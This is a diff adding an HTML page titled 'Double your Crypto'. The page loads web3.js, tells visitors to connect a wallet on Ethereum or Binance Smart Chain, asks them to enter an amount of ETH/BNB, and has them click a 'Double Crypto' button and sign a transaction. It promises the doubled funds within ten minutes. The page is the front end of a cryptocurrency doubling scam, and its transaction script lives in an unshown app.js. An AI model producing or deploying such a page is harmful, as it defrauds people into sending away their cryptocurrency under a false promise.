@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Double your Crypto</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <!--<style>
+        * {
+            margin: 0px;
+            padding: 0px;
+        }
+        
+        ol {
+            list-style: none;
+            margin: 10px;
+        }
+        
+        ul {
+            margin-left: 20px;
+        }
+        
+        body {
+            font-size: 25px;
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+            color: white;
+            background-color: grey;
+        }
+        
+        .container {
+            width: 95%;
+            text-align: left;
+            /* background-color:rgba(yellow, blue, pink, .1); */
+            margin-top: 20%;
+            /* margin-left: 10%; */
+            /* position: fixed; */
+            padding: 20px;
+        }
+        
+        .card {
+            /* color: green; */
+            background-color: rgba(0, 0, 0, 0.1);
+            width: 90%;
+            /* height: 90%; */
+            align-items: center;
+            border-radius: 33px;
+            margin-left: 5%;
+        }
+        
+        button {
+            color: black;
+            background-color: rgb(13, 255, 0);
+            border-radius: 3px;
+            width: 90%;
+            padding: 2px 3px 2px 3px;
+            font-size: 20px;
+            border-width: 5px;
+            border-style: solid;
+            border-color: aqua;
+            font-weight: bold;
+        }
+        
+        button:hover {
+            color: blue;
+            background-color: white;
+            border-radius: 2px;
+            width: 90%;
+            padding: 2px 3px 2px 3px;
+            font-size: 20px;
+            border-width: 5px;
+            border-style: solid;
+            border-color: rgb(13, 245, 206);
+            font-weight: bold;
+        }
+        
+        input {
+            color: white;
+            background-color: rgb(21, 20, 20);
+            margin: 0px;
+            border-radius: 5px;
+            width: 86%;
+            padding: 2px 3px 2px 3px;
+            font-size: 20px;
+            border-width: 5px;
+            border-style: solid;
+            border-color: aqua;
+            font-weight: bold;
+        }
+    </style> -->
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+    }
+
+    ol {
+      list-style: none;
+      margin: 10px;
+    }
+
+    ul {
+      margin-left: 20px;
+    }
+
+    body {
+      font-size: 25px;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #ffffff; /* White text */
+      background-color: #192841; /* Deep blue background */
+    }
+
+    .container {
+      width: 95%;
+      text-align: left;
+      background-color: rgba(255, 255, 255, 0.05); /* Slightly transparent white background */
+      margin-top: 20px;
+      padding: 20px;
+    }
+
+    .card {
+      background-color: rgba(30, 44, 76, 0.9); /* Semi-transparent sophisticated blue card background */
+      width: 90%;
+      align-items: center;
+      border-radius: 10px;
+      margin-left: 5%;
+    }
+
+    button {
+      color: #ffffff; /* White text */
+      background-color: #4CAF50; /* Green button for a positive action */
+      border-radius: 3px;
+      width: 90%;
+      padding: 15px;
+      font-size: 20px;
+      border: 2px solid #2ecc71; /* Light green border */
+      font-weight: bold;
+    }
+
+    button:hover {
+      color: #ffffff; /* White text on hover */
+      background-color: #2ecc71; /* Light green background on hover */
+      border: 2px solid #ffffff; /* White border on hover */
+    }
+
+    input {
+      color: #ffffff; /* White text */
+      background-color: #34495e; /* Dark blue-gray input background */
+      margin: 0;
+      border-radius: 5px;
+      width: 86%;
+      padding: 15px;
+      font-size: 20px;
+      border: 2px solid #3498db; /* Light blue border for contrast */
+      font-weight: bold;
+    }
+    
+  </style>
+</head>
+
+<body>
+    <div class="card">
+        <div class="container">D̾O̾U̾B̾L̾E̾ Y̾O̾U̾R̾ C̾R̾Y̾P̾T̾O̾
+          <br>
+          <br>
+            <ol>
+                <li>Step 1: Open in DApp</li>
+                <br>
+                <li>Step 2: Switch your network to Ethereum Mainnet or Binance SmartChain</li>
+                <br>
+                <li>Step 3: Write amount you want to double
+                <br>
+                <br>
+                    <input type="text" id="amount" placeholder="MIN: 0.02 ETH" />
+                    <ul>
+                      <br />
+                        <li>for example: if you want to double 2 ETH/BNB, write 2 ETH/BNB,</li>
+                        <br>
+                    </ul>
+                    <li>Step 3: Click<button id="sendTransactionButton">Double Crypto</button></li>
+                    <br>
+                    <li>Step 4: sign and Accept transaction to take place</li><br />
+                    <br>
+                    <li>You'll get your ETH/BNB in 10 mins</li>
+
+                </li>
+            </ol>
+        </div>
+    </div>
+    <br />
+
+    <script src="app.js"></script>
+</body>
+
+</html>
